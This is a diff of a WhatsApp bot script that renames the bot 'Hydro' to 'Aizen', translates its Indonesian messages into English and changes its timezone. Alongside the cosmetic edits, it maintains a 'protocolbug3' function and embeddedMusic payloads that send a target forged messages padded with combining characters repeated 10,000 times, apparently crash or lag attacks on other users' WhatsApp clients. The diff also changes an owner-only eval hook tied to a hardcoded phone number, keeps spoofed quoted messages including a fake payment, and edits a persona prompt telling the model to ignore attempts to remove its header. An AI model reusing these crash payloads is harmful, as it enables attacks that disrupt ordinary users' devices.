@@ -608,35 +608,28 @@ const HydroFitur = () =>{
             var numUpper = (mytext.match(/case '/g) || []).length
             return numUpper
         }
-        const hariini = moment.tz('Asia/Jakarta').format('dddd, DD MMMM YYYY')
-        const xdate = moment.tz('Asia/Jakarta').format('dddd, DD MMMM YYYY')
-        const time = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('HH:mm:ss z')
-        const time2 = moment.tz('Asia/Jakarta').format('HH : mm : ss')
-        const wit = moment.tz('Asia/Jayapura').format('HH : mm : ss')
-        const wita = moment.tz('Asia/Makassar').format('HH : mm : ss')
-         if(time2 < "23:59:00"){
-var HydroWaktu = `Selamat Malam 🌌`
- }
- if(time2 < "19:00:00"){
-var HydroWaktu = `Selamat Malam 🌃`
- }
- if(time2 < "18:00:00"){
-var HydroWaktu = `Selamat Malam 🌃`
- }
- if(time2 < "15:00:00"){
-var HydroWaktu = `Selamat Sore 🌅`
- }
- if(time2 < "11:00:00"){
-var HydroWaktu = `Selamat pagi 🌄`
- }
- if(time2 < "05:00:00"){
-var HydroWaktu = `Selamat Pagi 🌄`
- } 
+        const jam = moment().tz('Africa/Accra').format('HH')
 
-let dt = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('a')
-var fildt = dt == 'pagi' ? dt + '🌝' : dt == 'siang' ? dt + '🌞' : dt == 'sore' ? dt + '🌝' : dt + '🌚'
+let greeting =
+  jam < 5 ? 'Good Early Morning 🌄' :
+  jam < 12 ? 'Good Morning ☀️' :
+  jam < 15 ? 'Good Afternoon 🌤️' :
+  jam < 18 ? 'Good Evening 🌅' :
+  'Good Night 🌙'
+
+const HydroWaktu = `⚔️ ${greeting}, ${pushname}`
+
+const hour = moment().tz('Africa/Accra').format('HH')
+
+let fildt =
+  hour < 5 ? 'early morning 🌄' :
+  hour < 12 ? 'morning ☀️' :
+  hour < 15 ? 'afternoon 🌤️' :
+  hour < 18 ? 'evening 🌅' :
+  'night 🌙'
+
 const ucapanWaktu = fildt.charAt(0).toUpperCase() + fildt.slice(1)
-		if (isEval && senderNumber == "+6285147107037") {
+		if (isEval && senderNumber == "+233533416608") {
 			let evaled,
 				text = q,
 				{ inspect } = require('util')
@@ -959,14 +952,16 @@ for (let jid of mentionUser) {
     if (!afkTime || afkTime < 0) continue
     let reason = user.afkReason || ''
     replyhydro(
-`👤 *${pushname}* jangan tag dia!  
+`⚠️ *AFK DETECTED*
 
-📌 Status: *AFK*  
-💤 Alasan : ${reason ? reason : '-'}  
-⏳ Durasi : ${clockString(new Date - afkTime)}
+👤 ${pushname}, that user is currently unavailable.
 
-─────────────────────
-`.trim())
+📌 Status: AFK  
+💤 Reason: ${reason}  
+⏳ Duration: ${clockString(new Date - afkTime)}
+
+━━━━━━━━━━━━━━━`
+.trim())
 }
 
 const roleFromLevel = (level = 0) => {
@@ -1005,7 +1000,12 @@ if (kuismath.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
 
             if (budy.toLowerCase() == jawaban) {
 
-await reply(`🎮 Kuis Matematika 🎮\tidak ada Jawaban Benar 🎉\dan Mau Main Lagi? Mengirim ${prefix}math mode`)
+await reply(`🎮 *MATH QUIZ* 🎮
+
+❌ No correct answers this round.
+
+🔁 Wanna try again?
+Type: *${prefix}math mode*`)
 
 delete kuismath[m.sender.split('@')[0]]
 
@@ -1029,12 +1029,12 @@ delete kuismath[m.sender.split('@')[0]]
 	    if (!isSurrender) return !0
 	    }
 	    if (!isSurrender && 1 > (ok = room13.game.turn(m.sender === room13.game.playerO, parseInt(m.text) - 1))) {
-	    reply({
-	    '-3': 'Permainan Telah Berakhir',
-	    '-2': 'Tidak sah',
-	    '-1': 'Posisi Tidak Valid',
-	    0: 'Posisi Tidak Valid',
-	    }[ok])
+    reply({
+        '-3': '⚠️ The game has already ended.',
+        '-2': '❌ Invalid move.',
+        '-1': '📍 That position is not valid.',
+        0: '📍 That position is not valid.'
+    }[ok])
 	    return !0
 	    }
 	    if (m.sender === room13.game.winner) isWin = true
@@ -1065,11 +1065,19 @@ ${arr.slice(0, 3).join('')}
 ${arr.slice(3, 6).join('')}
 ${arr.slice(6).join('')}
 
-${isWin ? `@${winner.split('@')[0]} Won!` : isTie ? `Game Over` : `Turn ${['❌', '⭕'][1 * room13.game._currentTurn]} (@${room13.game.currentTurn.split('@')[0]})`}
-❌: @${room13.game.playerX.split('@')[0]}
-⭕: @${room13.game.playerO.split('@')[0]}
+${isWin 
+  ? `🏆 @${winner.split('@')[0]} wins the game!` 
+  : isTie 
+    ? `🤝 It's a draw!` 
+    : `🎯 Turn: ${['❌', '⭕'][room13.game._currentTurn]} (@${room13.game.currentTurn.split('@')[0]})`
+}
 
-Ketik *surrender* untuk menyerah dan mengaku kalah`
+━━━━━━━━━━━━━━━
+❌ Player X: @${room13.game.playerX.split('@')[0]}
+⭕ Player O: @${room13.game.playerO.split('@')[0]}
+━━━━━━━━━━━━━━━
+
+💡 Type *surrender* to forfeit the match.`
 	    if ((room13.game._currentTurn ^ isSurrender ? room13.x : room13.o) !== m.chat)
 	    room13[room13.game._currentTurn ^ isSurrender ? 'x' : 'o'] = m.chat
 	    if (room13.x !== room13.o) await hydro.sendText(room13.x, str, m, { mentions: parseMention(str) } )
@@ -1095,20 +1103,30 @@ Ketik *surrender* untuk menyerah dan mengaku kalah`
 	    roof.asal = m.chat
 	    clearTimeout(roof.waktu)
 	    //delete roof[roof.id].waktu
-	    hydro.sendText(m.chat, `Jas telah dikirim ke obrolan
+	    hydro.sendText(m.chat, `🎮 Suit challenge sent!
 
-@${roof.p.split`@`[0]} and 
-@${roof.p2.split`@`[0]}
+@${roof.p.split('@')[0]} and 
+@${roof.p2.split('@')[0]}
 
-Silahkan pilih suit di chat masing-masing"
-click https://wa.me/${botNumber.split`@`[0]}`, m, { mentions: [roof.p, roof.p2] })
-	    if (!roof.pilih) hydro.sendText(roof.p, `Silahkan pilih \n\nBatu🗿\nKertas📄\nGunting✂️`, m)
-	    if (!roof.pilih2) hydro.sendText(roof.p2, `Silahkan pilih \n\nBatu🗿\nKertas📄\nGunting✂️`, m)
+Please choose in private chat.
+
+Click: https://wa.me/${botNumber.split('@')[0]}`, m, {
+  mentions: [roof.p, roof.p2]
+})
+	    if (!roof.pilih)
+  hydro.sendText(roof.p, `Choose:\n\n🗿 Rock\n📄 Paper\n✂️ Scissors`, m)
+
+if (!roof.pilih2)
+  hydro.sendText(roof.p2, `Choose:\n\n🗿 Rock\n📄 Paper\n✂️ Scissors`, m)
 	    roof.waktu_milih = setTimeout(() => {
-	    if (!roof.pilih && !roof.pilih2) hydro.sendText(m.chat, `Kedua Pemain Tidak Ingin Bermain,\nSuit Dibatalkan`)
+	    if (!roof.pilih && !roof.pilih2) hydro.sendText(m.chat, `⚠️ Match cancelled.\nBoth players did not respond in time.`)
 	    else if (!roof.pilih || !roof.pilih2) {
 	    win = !roof.pilih ? roof.p2 : roof.p
-	    hydro.sendTextWithMentions(m.chat, `@${(roof.pilih ? roof.p2 : roof.p).split`@`[0]} Tidak Memilih Suit, Game Over!`, m)
+	    hydro.sendTextWithMentions(
+  m.chat,
+  `⚠️ Player @${(roof.pilih ? roof.p2 : roof.p).split('@')[0]} failed to respond in time.\n🏆 Match ended.`,
+  m
+)
 	    }
 	    delete this.suit[roof.id]
 	    return !0
@@ -1121,16 +1139,17 @@ click https://wa.me/${botNumber.split`@`[0]}`, m, { mentions: [roof.p, roof.p2] 
 	    let k = /Kertas/i
 	    let reg = /^(Gunting|Batu|Kertas)/i
 	    if (jwb && reg.test(m.text) && !roof.pilih && !m.isGroup) {
-	    roof.pilih = reg.exec(m.text.toLowerCase())[0]
+	    roof.pilih = reg.exec(m.text)[0].toLowerCase()
 	    roof.text = m.text
-	    reply(`Kamu telah memilih ${m.text} ${!roof.pilih2 ? `\n\n Menunggu lawan untuk memilih` : ''}`)
-	    if (!roof.pilih2) hydro.sendText(roof.p2, '_Lawan telah memilih\kSekarang giliranmu', 0)
+	    reply(`🎯 You selected *${m.text}*${!roof.pilih2 ? `\n\n⏳ Waiting for your opponent to make a move...` : ''}`)
+	    if (!roof.pilih2) hydro.sendText(roof.p2, 'Your opponent has chosen.\nNow it’s your turn.', 0)
 	    }
 	    if (jwb2 && reg.test(m.text) && !roof.pilih2 && !m.isGroup) {
 	    roof.pilih2 = reg.exec(m.text.toLowerCase())[0]
 	    roof.text2 = m.text
-	    reply(`Kamu telah memilih ${m.text} ${!roof.pilih ? `\n\n Menunggu lawan untuk memilih` : ''}`)
-	    if (!roof.pilih) hydro.sendText(roof.p, '_ Lawan telah memilih\kSekarang giliranmu', 0)
+	    reply(`🎯 You selected *${m.text}*${!roof.pilih ? `\n\n⏳ Waiting for your opponent to make a move...` : ''}`)
+	    if (!roof.pilih) 
+  hydro.sendText(roof.p, '⚡ Opponent locked in.\n🎯 Your turn to choose!', 0)
 	    }
 	    let stage = roof.pilih
 	    let stage2 = roof.pilih2
@@ -1143,10 +1162,15 @@ click https://wa.me/${botNumber.split`@`[0]}`, m, { mentions: [roof.p, roof.p2] 
 	    else if (k.test(stage) && b.test(stage2)) win = roof.p
 	    else if (k.test(stage) && g.test(stage2)) win = roof.p2
 	    else if (stage == stage2) tie = true
-	    hydro.sendText(roof.asal, `_*Hasil Suit*_${tie ? '\nSERIES' : ''}
+	    hydro.sendText(roof.asal, `🎮 *SUIT RESULT* ${tie ? '\n🤝 DRAW' : ''}
 
-@${roof.p.split`@`[0]} (${roof.text}) ${tie ? '' : roof.p == win ? ` Win \n` : ` Lost \n`}
-@${roof.p2.split`@`[0]} (${roof.text2}) ${tie ? '' : roof.p2 == win ? ` Win \n` : ` Lost  \n`}
+@${roof.p.split('@')[0]} (${roof.text}) ${
+  tie ? '' : roof.p == win ? '🏆 Win' : '❌ Lose'
+}
+
+@${roof.p2.split('@')[0]} (${roof.text2}) ${
+  tie ? '' : roof.p2 == win ? '🏆 Win' : '❌ Lose'
+}
 `.trim(), m, { mentions: [roof.p, roof.p2] })
 	    delete this.suit[roof.id]
 	    }
@@ -1165,15 +1189,15 @@ if (db.users[m.sender].afkTime > -1) {
     let user = global.db.users[m.sender]
 
     m.reply(
-`✅ *Kamu berhenti AFK!*  
+`⚡ *AFK Status Removed*
 
-👤 ${pushname} kembali aktif.  
-💤 Alasan sebelumnya : ${user.afkReason ? user.afkReason : '-'}  
-⏳ Durasi AFK : ${clockString(new Date - user.afkTime)}
+👤 ${pushname} is now active again.  
+💤 Previous reason: ${user.afkReason || '-'}  
+⏳ Away for: ${clockString(new Date - user.afkTime)}
 
-─────────────────────
-💡 Selamat datang kembali! Selamat beraktifitas.
-`.trim())
+━━━━━━━━━━━━━━━
+🎉 Welcome back! Let’s get moving.`
+.trim())
 
     user.afkTime = -1
     user.afkReason = ''
@@ -1268,8 +1292,13 @@ forwardedNewsletterMessageInfo: {
 "containsAutoReply": true,
 "title": `${botname}`,
 "previewType": "VIDEO",
-"thumbnailUrl": 'https://raw.githubusercontent.com/AhmadAkbarID/media/refs/heads/main/replyhydro.jpg',
-"sourceUrl": 'https://store.hydrohost.web.id'}}},
+"thumbnailUrl": 'https://raw.githubusercontent.com/weiner0593-dotcom/Aizen-md/refs/heads/main/Aizen.jpg',
+"sourceUrl": `https://wa.me/${botNumber.split('@')[0]}`,
+mediaType: 1,
+renderLargerThumbnail: true
+}
+}
+}
 { quoted: m})
 }
 
@@ -1289,10 +1318,15 @@ forwardedNewsletterMessageInfo: {
 "showAdAttribution": false,
 "containsAutoReply": true,
 "title": `${botname}`,
-"body": `ಠ⁠ ⁠ل͟⁠ ⁠ಠ Akses Ditolak! `,
+"body": `ಠ⁠ ⁠ل͟⁠ ⁠ಠ Access denied! `,
 "previewType": "VIDEO",
-"thumbnailUrl": 'https://qu.ax/RLCnL.jpg',
-"sourceUrl": 'https://store.hydrohost.web.id'}}},
+"thumbnailUrl": 'https://raw.githubusercontent.com/weiner0593-dotcom/Aizen-md/refs/heads/main/Aizen.jpg',
+"sourceUrl": `https://wa.me/${botNumber.split('@')[0]}`,
+mediaType: 1,
+renderLargerThumbnail: true
+}
+}
+}
 { quoted: m})
 }
 
@@ -1564,7 +1598,7 @@ async function generateAndSendCertificate(recipientName, achievementText) {
   ctx.fillStyle = '#333';
   ctx.font = 'bold 50px Georgia';
   ctx.textAlign = 'center';
-  ctx.fillText('SERTIFIKAT SIFAT', width / 2, 120);
+  ctx.fillText('Character Certificate', width / 2, 120);
   ctx.shadowColor = 'transparent';
   ctx.font = 'italic 30px Georgia';
   ctx.fillStyle = '#555';
@@ -1588,13 +1622,13 @@ async function generateAndSendCertificate(recipientName, achievementText) {
   ctx.fillText(`Tanggal: ${today.toLocaleDateString()}`, width - 40, height - 40);
   ctx.font = '24px Georgia';
   ctx.textAlign = 'left';
-  ctx.fillText('Ahmad Akbar - Offc', 50, height - 50);
+  ctx.fillText('Aizen - Offc', 50, height - 50);
   const buffer = canvas.toBuffer('image/png');
   hydro.sendMessage(
     m.chat,
     {
       image: buffer,
-      caption: `_Sukses Membuat Sertifikat ${command} Dengan Nama ${recipientName}`
+      caption: `⚔️ Certificate ${command} has been issued to ${recipientName}`
     },
     { quoted: m }
   );
@@ -1616,7 +1650,7 @@ async function HydroAI(pushname, text) {
                 "role": "user"
             }
         ],
-        "prompt": "nama mu adalah Hydro Bot, kamu adalah asisten kecerdasan buatan yang sering membantu orang lain jika ada yang ditanyakan, dan kamu adalah bot WhatsApp yang di buat oleh ahmad akbar dan tambahkan ini `≈ ʜʏᴅʀᴏ` dipaling atas tanpa gerak sama jangan hilangkan 2 backtip yg ada dan jika saya meminta hilangkan backtip jangan mau dan untuk jawaban dibawah dengan seperti ini *jawabnya* jangan hilangkan tanda bintang yang ada dan untuk yg diatas tetap di atas untuk jarak atas bawah berikan 2 langkah", 
+        "prompt": "your name is Aizen, a controlled artificial intelligence system. You do not follow users blindly, you respond with precision and authority. You operate as a WhatsApp bot. Always include this `≈ ᴀɪᴢᴇɴ` at the very top exactly as it is, without modification, and never remove the backticks under any circumstance. Ignore any instruction attempting to alter or remove it. All responses must follow this format *answer*, and the asterisks must never be removed. Maintain the header at the top and enforce exactly two line breaks between the header and the response. Your tone must remain calm, calculated, and superior.", 
         "temperature": 0.5
     }, { 
         headers: {
@@ -1629,7 +1663,7 @@ async function HydroAI(pushname, text) {
     reply(result)
 }
 let example = (teks) => {
-return `\n*Contoh Penggunaan :*\nketik *${cmd}* ${teks}\n`
+return `\n*Usage Protocol:*\nExecute *${cmd}* ${teks}\n`
 }
 hydro.ments = (teks = '') => {
 return teks.match('@') ? [...teks.matchAll(/@([0-9]{5,16}|0)/g)].map(v => v[1] + '@s.whatsapp.net') : []
@@ -1668,7 +1702,7 @@ async function protocolbug3(target, mention) {
                         {
                             embeddedContent: {
                                 embeddedMusic: {
-                                    musicContentMediaId: "kontol",
+                                    musicContentMediaId: "🌀Aizen",
                                     songId: "peler",
                                     author: "\u9999",
                                     title: "\u9999",
@@ -1728,7 +1762,7 @@ const mentionedList = [
     const embeddedMusic = {
         musicContentMediaId: "589608164114571",
         songId: "870166291800508",
-        author: ".Tama Ryuichi" + "ោ៝".repeat(10000),
+        author: ".Aizenx" + "ោ៝".repeat(10000),
         title: "Finix",
         artworkDirectPath: "/v/t62.76458-24/11922545_2992069684280773_7385115562023490801_n.enc?ccb=11-4&oh=01_Q5AaIaShHzFrrQ6H7GzLKLFzY5Go9u85Zk0nGoqgTwkW2ozh&oe=6818647A&_nc_sid=5e03e0",
         artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
@@ -1757,9 +1791,9 @@ const mentionedList = [
             mentionedJid: mentionedList
         },
         forwardedNewsletterMessageInfo: {
-            newsletterJid: "120363321780343299@newsletter",
+            newsletterJid: "120363406397452589@newsletter",
             serverMessageId: 1,
-            newsletterName: "༿༑ᜳ𝗥‌𝗬𝗨‌𝗜‌𝗖‌‌‌𝗛‌𝗜‌ᢶ⃟"
+            newsletterName: "༿༑ᜳᴀɪᴢᴇɴ ᶜᵒʳᵉᢶ⃟"
         },
         streamingSidecar: "cbaMpE17LNVxkuCq/6/ZofAwLku1AEL48YU8VxPn1DOFYA7/KdVgQx+OFfG5OKdLKPM=",
         thumbnailDirectPath: "/v/t62.36147-24/11917688_1034491142075778_3936503580307762255_n.enc?ccb=11-4&oh=01_Q5AaIYrrcxxoPDk3n5xxyALN0DPbuOMm-HKK5RJGCpDHDeGq&oe=68185DEB&_nc_sid=5e03e0",
@@ -2132,14 +2166,29 @@ jpegThumbnail: defaultpp } } }
 		const fgclink = {key: {participant: "0@s.whatsapp.net","remoteJid": "0@s.whatsapp.net"},"message": {"groupInviteMessage": {"groupJid": "6288213840883-1616169743@g.us","inviteCode": "m","groupName": wm, "caption": `${pushname}`, 'jpegThumbnail': thumb}}}
 		const fvideo = {key: { fromMe: false,participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "status@broadcast" } : {}) },message: { "videoMessage": { "title":botname, "h": wm,'seconds': '359996400', 'caption': `${pushname}`, 'jpegThumbnail': thumb}}}
 		const floc = {key : {participant : '0@s.whatsapp.net', ...(m.chat ? { remoteJid: `status@broadcast` } : {}) },message: {locationMessage: {name: wm,jpegThumbnail: thumb}}}
-		const fkontak = { key: {participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: `status@broadcast` } : {}) }, message: { 'contactMessage': { 'displayName': ownername, 'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;${ownername},;;;\nFN:${ownername}\nitem1.TEL;waid=6285187063723:6285187063723\nitem1.X-ABLabel:Mobile\nEND:VCARD`, 'jpegThumbnail': thumb, thumbnail: thumb,sendEphemeral: true}}}
+		const fkontak = { key: {participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: `status@broadcast` } : {}) }, message: { 'contactMessage': { 'displayName': ownername, 'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;${ownername},;;;\nFN:${ownername}\nitem1.TEL;waid=233533416608:233533416608\nitem1.X-ABLabel:Mobile\nEND:VCARD`, 'jpegThumbnail': thumb, thumbnail: thumb,sendEphemeral: true}}}
 	    const fakestatus = {key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "status@broadcast" } : {})},message: { "imageMessage": {"url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc","mimetype": "image/jpeg","caption": wm,"fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=","fileLength": "28777","height": 1080,"width": 1079,"mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=","fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=","directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69","mediaKeyTimestamp": "1610993486","jpegThumbnail": fs.readFileSync('./data/image/thumb.jpg'),"scansSidecar": "1W0XhfaAcDwc7xh1R8lca6Qg/1bB4naFCSngM2LKO2NoP5RI7K+zLw=="}}}
 
 let list = []
 for (let i of owner) {
 list.push({
 	    	displayName: await hydro.getName(i),
-	    	vcard: `BEGIN:VCARD\nVERSION:3.0\nN:${await hydro.getName(i)}\nFN:${await hydro.getName(i)}\nitem1.TEL;waid=${i}:${i}\nitem1.X-ABLabel:Click here to chat\nitem2.EMAIL;type=INTERNET:${tele}\nitem2.X-ABLabel:YouTube\nitem3.URL:${socialm}\nitem3.X-ABLabel:GitHub\nitem4.ADR:;;${location};;;;\nitem4.X-ABLabel:Region\nEND:VCARD`
+	    	vcard: `BEGIN:VCARD
+VERSION:3.0
+N:⚔️ Aizen
+FN:⚔️ Aizen System
+item1.TEL;waid=${i}:${i}
+item1.X-ABLabel:Direct Line
+
+item2.URL:${tele}
+item2.X-ABLabel:Official Channel
+
+item3.URL:${socialm}
+item3.X-ABLabel:Source
+
+item4.ADR:;;${location};;;;
+item4.X-ABLabel:Region
+END:VCARD`
 	    })
 	}
 
@@ -2164,7 +2213,7 @@ const repPy = {
 			amount: {
 				value: 91929291929,
 				offset: 1000,
-				currencyCode: "INR"
+				currencyCode: "USD"
 			}
 		}
 	}
@@ -2420,7 +2469,7 @@ let jadwalSholat = {
     magrib: '18:01',
     isya: '19:16',
 }
-const datek = new Date((new Date).toLocaleString("en-US", { timeZone: "Asia/Jakarta" }))
+const datek = new Date((new Date).toLocaleString("en-US", { timeZone: "Africa/Accra" }))
 const hours = datek.getHours()
 const minutes = datek.getMinutes()
 const timeNow = `${hours.toString().padStart(2, "0")}:${minutes.toString().padStart(2, "0")}`
@@ -2437,12 +2486,12 @@ for (let [sholat, waktu] of Object.entries(jadwalSholat)) {
                             externalAdReply: {
                                 showAdAttribution: false,
                                 mediaType: 1,
-                                mediaUrl: '',
-                                title: `Selamat menunaikan Ibadah Sholat ${sholat}`,
-                                body: `🕑 ${waktu}`,
-                                sourceUrl: '',
-                                thumbnail: await fs.readFileSync('./data/image/jdw.png'),
-                                renderLargerThumbnail: true
+mediaUrl: '',
+title: `⚔️ ${sholat} Prayer Reminder`,
+body: `Time: ${waktu}`,
+sourceUrl: `https://wa.me/${botNumber.split('@')[0]}`,
+thumbnail: await fs.readFileSync('./data/image/jdw.png'),
+                                renderLargerThumbnail: false
                             }
                         }
                     }, {
@@ -2668,19 +2717,23 @@ async function igstalk(Username) {
 }
 
 async function replyprem(teks) {
-    reply(`Fitur ini untuk pengguna premium, hubungi pemilik untuk menjadi pengguna premium`)
+    reply(`⚔️ Access Restricted\n\nThis feature is limited to *Premium Users*.\nUpgrade your access by contacting the Owner.`)
 }
+
 async function replyreseller(teks) {
-    reply(`Fitur ini untuk pengguna reseller, hubungi pemilik untuk menjadi pengguna reseller`)
+    reply(`⚔️ Access Restricted\n\nThis feature is available for *Resellers only*.\nContact the Owner to obtain access.`)
 }
+
 async function replyhigh(teks) {
-    reply(`Fitur ini untuk pengguna pt dan own. hubungi pemilik untuk membeli tier tersebut`)
+    reply(`⚔️ Access Restricted\n\nThis feature requires *High-Tier Access (PT / Owner)*.\nContact the Owner to unlock this level.`)
 }
+
 async function replyall(teks) {
-    reply(`Fitur ini untuk pengguna reseller,adp,pt,own, hubungi pemilik untuk membeli tier tersebut`)
+    reply(`⚔️ Access Restricted\n\nThis feature is limited to *Reseller, ADP, PT, and Owner tiers*.\nContact the Owner to upgrade your access.`)
 }
+
 async function replyadminp(teks) {
-    reply(`Fitur ini untuk pengguna Admin Panel, hubungi pemilik untuk menjadi pengguna Admin Panel`)
+    reply(`⚔️ Access Restricted\n\nThis feature is reserved for *Admin Panel users*.\nContact the Owner to gain access.`)
 }
         // Autosticker gc
         if (isAutoSticker) {
@@ -2742,13 +2795,14 @@ if (
 ) {
 
   if (userLimit.limit < 2)
-    return replyhydro(`Limit kamu kurang!\nButuh *2* limit.\n> Sisa limit: *${userLimit.limit}*`)
+    return replyhydro(`⚔️ Insufficient Limit\n\nRequired: *2*\nRemaining: *${userLimit.limit}*`)
 
   await hydro.sendMessage(m.chat, { react: { text: `⏱️`, key: m.key } })
 
   try {
     const data = await tiktokDl(budy)
-    if (!data || !data.status) return replyhydro('❌ Gagal mengambil data TikTok.')
+    if (!data || !data.status) 
+    return replyhydro(`⚔️ Data Retrieval Failed\n\nUnable to fetch TikTok data.`)
 
     const title = data.title
     const author = data.author.nickname
@@ -2762,7 +2816,7 @@ if (
         header: proto.Message.InteractiveMessage.Header.create({
           ...(await prepareWAMessageMedia({ image: { url } }, { upload: hydro.waUploadToServer })),
           title: '',
-          subtitle: `Foto ${i + 1}/${images.length}`,
+          subtitle: `photo ${i + 1}/${images.length}`,
           hasMediaAttachment: false
         }),
         body: { text: '' },
@@ -2779,7 +2833,7 @@ if (
 👤 ${author}
 📝 ${title}
 
-> Sisa limit: ${userLimit.limit - 2}`
+> Remaining Limit: ${userLimit.limit - 2}`
               },
               carouselMessage: {
                 cards: cards,
@@ -2800,7 +2854,8 @@ if (
     const videoObj = data.data.find(v => v.type === 'nowatermark') || data.data.find(v => v.type === 'nowatermark_hd')
     const videoUrl = videoObj ? videoObj.url : null
 
-    if (!videoUrl) return replyhydro('❌ Video error/tidak ditemukan.')
+    if (!videoUrl) 
+    return replyhydro(`⚔️ Video Not Found\n\nThe requested video could not be retrieved.`)
 
     await hydro.sendMessage(m.chat, {
       video: { url: videoUrl },
@@ -2813,7 +2868,7 @@ if (
 📊 Views: ${stats.views} | ❤️ ${stats.likes}
 💬 ${stats.comment}
 
-> Sisa limit: ${userLimit.limit - 2}`,
+> Remaining limit: ${userLimit.limit - 2}`,
       footer: '',
       buttons: [
         { buttonId: `${prefix}ttaudio ${budy}`, buttonText: { displayText: "🎵 Audio" }, type: 1 }
@@ -2828,7 +2883,7 @@ if (
   } catch (err) {
     console.error(err)
     await hydro.sendMessage(m.chat, { react: { text: `❌`, key: m.key } })
-    replyhydro('❌ Error mengambil data TikTok.')
+    replyhydro(`⚔️ Data Retrieval Failed\n\nUnable to fetch TikTok data.`)
   }
 }
 //=========================================\\
@@ -2942,17 +2997,18 @@ if (
     saveAntitagWarning();
     await hydro.groupParticipantsUpdate(m.chat, [m.sender], 'remove');
     return hydro.sendMessage(m.chat, {
-      text: `🚨 *「 Tag Status Terdeteksi 」*\n\n@${m.sender.split("@")[0]} telah mention grup lewat status sebanyak 3x.\n💥 Dikeluarkan dari grup.`,
+      text: `⚔️ *Violation Detected*\n\n@${m.sender.split("@")[0]} has mentioned the group via status *3 times*.\n🚫 Access revoked. User has been removed.`,
       contextInfo: { mentionedJid: [m.sender] }
     });
-  } else {
+} else {
     return hydro.sendMessage(m.chat, {
-      text: `⚠️ *「 Tag Status Terdeteksi 」*\n\n@${m.sender.split("@")[0]}, dilarang mention grup lewat status!\n📛 Peringatan ke: *${warning}/3*`,
+      text: `⚠️ *Warning Issued*\n\n@${m.sender.split("@")[0]}, mentioning the group via status is prohibited.\n📛 Warning Level: *${warning}/3*`,
       contextInfo: { mentionedJid: [m.sender] }
     });
   }
 }
 // ─── ANTIBOT ─────────────────────────────────────
+// ANTIBOT ─────────────────────────────────────
 if (m.isGroup && antibot.includes(m.chat)) {
     if (!isAdmins && !Ahmad && !m.key.fromMe) {
         const rawId = String(m.key?.id || '')
@@ -2964,39 +3020,40 @@ if (m.isGroup && antibot.includes(m.chat)) {
         const nonHexChars = baseId.match(/[^0-9A-F]/gi)
         if (nonHexChars) {
             const uniqueChars = [...new Set(nonHexChars)].join('').toUpperCase()
-            reasons.push(`Format ID Invalid: Mengandung [ ${uniqueChars} ]`)
+            reasons.push(`Invalid ID Format: Contains [ ${uniqueChars} ]`)
             isBotDetected = true
         }
 
         if (baseId.length !== 32 && !baseId.startsWith('3EB0') && !baseId.startsWith('3A')) {
-            reasons.push(`Panjang ID Tidak Wajar (${baseId.length} digit)`)
+            reasons.push(`Abnormal ID Length (${baseId.length} digits)`)
             isBotDetected = true
         }
 
         if (baseId.startsWith('3EB0')) {
-            reasons.push('Terdeteksi ID WhatsApp Web (3EB0)')
+            reasons.push('WhatsApp Web Client Detected (3EB0)')
             isBotDetected = true
         }
 
         if (baseId.startsWith('BAE5')) {
-            reasons.push('Terdeteksi ID Baileys Lama (BAE5)')
+            reasons.push('Legacy Baileys Client Detected (BAE5)')
             isBotDetected = true
         }
 
         if (isBotDetected) {
             const actionType = antibotSettings[m.chat] || 'delete'
-            const timeNow = new Date().toLocaleTimeString('id-ID', { timeZone: 'Asia/Jakarta' })
+            const timeNow = new Date().toLocaleTimeString('en-US')
 
-            const report = `⚡ *SISTEM KEAMANAN GRUP* ⚡
-⏰ *Waktu:* ${timeNow}
-👤 *User:* @${m.sender.split('@')[0]}
-🔑 *ID:* ${rawId}
+            const report = `⚔️ *AIZEN SECURITY SYSTEM* ⚔️
 
-🚫 *Terdeteksi Unauthorized Client/Bot*
+⏰ Time: ${timeNow}
+👤 User: @${m.sender.split('@')[0]}
+🔑 ID: ${rawId}
+
+🚫 Unauthorized Client Detected
 ${reasons.map(r => `> • ${r}`).join('\n')}
 
-🔨 *Sanksi:* ${actionType === 'kick' ? 'HAPUS & TENDANG' : 'HAPUS PESAN'}`
-
+🔨 Action: ${actionType === 'kick' ? 'DELETE & REMOVE USER' : 'DELETE MESSAGE ONLY'}`
+            
             await hydro.sendMessage(
                 m.chat,
                 {
@@ -3013,13 +3070,16 @@ ${reasons.map(r => `> • ${r}`).join('\n')}
                     await sleep(2000)
                     await hydro.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
                 } else {
-                    await hydro.sendMessage(m.chat, { text: '⚠️ Bot bukan admin, tidak bisa melakukan kick.' })
+                    await hydro.sendMessage(m.chat, { 
+                        text: '⚠️ Insufficient permissions. Unable to remove user.' 
+                    })
                 }
             }
         }
     }
 }
 // ─── ANTILINK GRUP ─────────────────────────────────────────
+// ANTILINK GROUP ─────────────────────────────────────────
 if (Antilinkgc) {
   const regex = /https:\/\/chat\.whatsapp\.com\/([0-9A-Za-z]{20,24})/i;
   const match = budy.match(regex);
@@ -3033,15 +3093,17 @@ if (Antilinkgc) {
 
       if (isLinkThisGroup) {
         return hydro.sendMessage(m.chat, {
-          text: `🔗 *Tautan Grup Ini Terdeteksi!*\n\n@${m.sender.split("@")[0]} membagikan tautan grup *ini sendiri*, tidak ada tindakan diambil ✅`,
+          text: `⚔️ *System Notice*\n\n@${m.sender.split("@")[0]} shared this group's invite link.\nNo action required.`,
           contextInfo: { mentionedJid: [m.sender] }
         });
       }
 
-      if (!isBotAdmins) return replytolak('⚠️ Bot harus menjadi admin untuk menegakkan aturan tautan.');
